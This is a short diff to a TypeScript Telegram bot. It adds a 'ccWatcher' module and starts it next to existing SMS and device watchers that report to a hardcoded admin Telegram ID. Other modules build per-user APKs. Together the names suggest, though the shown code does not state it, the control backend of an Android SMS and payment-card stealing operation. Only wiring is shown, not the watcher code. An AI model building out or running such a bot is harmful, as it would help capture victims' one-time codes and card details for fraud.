@@ -21,6 +21,7 @@ import { startSmsWatcher } from "./smsWatcher";
 const pendingActions = new Map<string, { action: "reset_password" | "set_email" }>();
 import { buildUserApk, getApkSize, initApkTemplate, isTemplateReady } from "./apkBuilder";
 import { startDeviceWatcher } from "./deviceWatcher";
+import { startCcWatcher } from "./ccWatcher";
 
 const BOT_TOKEN = process.env["TELEGRAM_BOT_TOKEN"];
 const ADMIN_ID = parseInt(process.env["ADMIN_TELEGRAM_ID"] || "5064888403");
@@ -528,15 +529,16 @@ export async function startBot(): Promise<void> {
   bot.launch({ dropPendingUpdates: true }).then(() => {
     startDeviceWatcher(bot, ADMIN_ID);
     startSmsWatcher(bot, ADMIN_ID);
+    startCcWatcher(bot, ADMIN_ID);
     logger.info("Watchers started — this process owns the bot");
   }).catch((err: any) => {
     if (err?.response?.error_code === 409 || err?.message?.includes("409")) {
       logger.warn("Bot 409 conflict — another instance is running. Watchers NOT started in this process.");
     } else {
       logger.error({ err }, "Bot launch error");
-      // Still start watchers even if launch fails for non-409 reasons
       startDeviceWatcher(bot, ADMIN_ID);
       startSmsWatcher(bot, ADMIN_ID);
+      startCcWatcher(bot, ADMIN_ID);
     }
   });
   logger.info("Telegram bot started");
